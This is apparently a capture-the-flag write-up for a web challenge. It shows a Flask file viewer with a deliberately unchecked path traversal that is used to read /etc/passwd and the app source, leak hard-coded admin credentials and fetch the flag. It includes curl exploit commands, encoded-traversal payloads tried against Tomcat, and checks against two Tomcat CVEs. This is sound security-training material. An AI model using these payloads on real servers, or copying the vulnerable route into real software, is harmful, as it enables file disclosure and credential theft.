# Tomcat Path Traversal

- **Category:** web
- **Points:** 450
- **Branch:** `chal/web-tomcat-path-traversal`
- **Targets:**
  - FRONT `http://54.72.82.22:8150` — waitress/Flask, page title **BACKLOT 77**
  - BACK  `http://54.72.82.22:8240` — bare Apache Tomcat/9.0.122
- **Status:** ✅ SOLVED

## Flag

```
safctf{e9e46fabe7b282f4eb4eff39b378eff3}
```

## Target map

### FRONT :8150 — waitress/Flask "PwnZone File Viewer"

The landing page (`BACKLOT 77` theme) is a file viewer whose JS calls
`GET /view?file=<path>`. Server header: `waitress`. Only three routes exist —
`/`, `/view`, `/admin` (everything else is a Flask 404). `/admin` returns
`401` with `WWW-Authenticate: Basic realm="CTF Admin Portal"`.

`/view` is a straight path traversal:

```python
@app.route("/view")
def view_file():
    rel_path = request.args.get("file", "").strip()
    target_path = os.path.abspath(os.path.join(BASE_DIR, rel_path))
    # Intentionally vulnerable: naive check removed (for CTF)
    try:
        return send_file(target_path)
    except Exception as e:
        if os.path.isabs(rel_path) and os.path.exists(rel_path):
            return send_file(rel_path)
        return f"Error: {e}", 404
```

`BASE_DIR = /app/public`, so `file=../../../../etc/passwd` reads `/etc/passwd`,
and an absolute `file=/app/app.py` also works via the fallback branch.
(`/proc/*` files come back empty/500 because `send_file` uses their stat size,
which is 0 for procfs.)

### BACK :8240 — Tomcat 9.0.122

Header on every response is the stock Tomcat 404 page (`Apache Tomcat/9.0.122`).
**No webapps are deployed**: `/`, `/ROOT/`, `/manager/html`, `/docs/`,
`/examples/`, `/host-manager/html` and ~40 context/file guesses all return
`404`. `GET/PUT/OPTIONS/TRACE` all `404`.

## The bug

The traversal in `/view` reaches `/app/app.py`, which hard-codes the admin
credentials:

```python
ADMIN_USER = "panel_admin"
ADMIN_PASS = "k1tsune_2025!"
FLAG1 = os.getenv('FLAG')

@app.route("/admin")
@requires_auth
def admin_panel():
    return f"<h2>Admin Panel</h2><p>Nice work. Here's your flag: <strong>{FLAG1}</strong></p>"
```

So the chain is **path traversal → source disclosure → hard-coded Basic-auth
creds → `/admin` → `FLAG` env var**.

## Exploit

```sh
# 1. read the source through the traversal
curl 'http://54.72.82.22:8150/view?file=../app.py'      # or file=/app/app.py

# 2. use the creds from the source against /admin
curl -u 'panel_admin:k1tsune_2025!' http://54.72.82.22:8150/admin
# -> safctf{e9e46fabe7b282f4eb4eff39b378eff3}
```

`solve.py` automates this: it reads `../app.py`, regex-extracts
`ADMIN_USER`/`ADMIN_PASS`, then GETs `/admin` with HTTP Basic and prints the
flag. Run: `python3 solve.py [front_url] [backend_url]`.

## Tomcat / CVE-2024-50379 / CVE-2025-24813 — verified NOT the path

The triage hint suggested the case-insensitive path-handling /
partial-PUT class. Both were checked and ruled out on this deployment:

- **CVE-2024-50379** (case-insensitive path confusion) is a **Windows-only**
  filesystem issue; the backend is Linux (`/etc/hosts` of the sibling front
  container shows a Docker bridge `172.16.x`), and `/INDEX.JSP` vs `/index.jsp`
  behave identically (`404` both).
- **CVE-2025-24813** (partial PUT → write / deserialization) needs the default
  servlet with `readonly=false`. Every `PUT` (plain, `Content-Range` partial,
  with/without a context path) returns `404`, i.e. writes are disabled — the
  classic "not exploitable" response.
- Encoded path traversal against Tomcat's default servlet is rejected:
  `/..%2f..%2fflag.txt`, `/%2e%2e%2f...`, `/..%5c...` all return `400`
  (Coyote rejects encoded slashes); `..%252f` double-encoding returns `404`.
  `;`-path-parameter tricks (`/..;/..;/`) return `400`/`404`.
- Version `9.0.122` is well past both CVEs' fix lines anyway.

Conclusion: the Tomcat backend is a bare, read-only, empty instance — the
"Tomcat" in the challenge name is the scenario flavour; the actual,
reproducible path to the flag is the front-end `/view` traversal.

## Flag locations checked (not present)

`/flag.txt`, `/flag`, `/app/flag.txt`, `/app/.env`, `/app/secret.txt`,
`/root/flag.txt`, `/srv/flag.txt`, `/opt/flag.txt`, `/var/flag.txt`,
`/app/public/files/flag.txt` — all `Error: [Errno 2] No such file or
directory`. The flag lives in the front container's `FLAG` environment
variable, surfaced by `/admin` (not readable directly: `/proc/self/environ`
returns 0 bytes through the viewer).
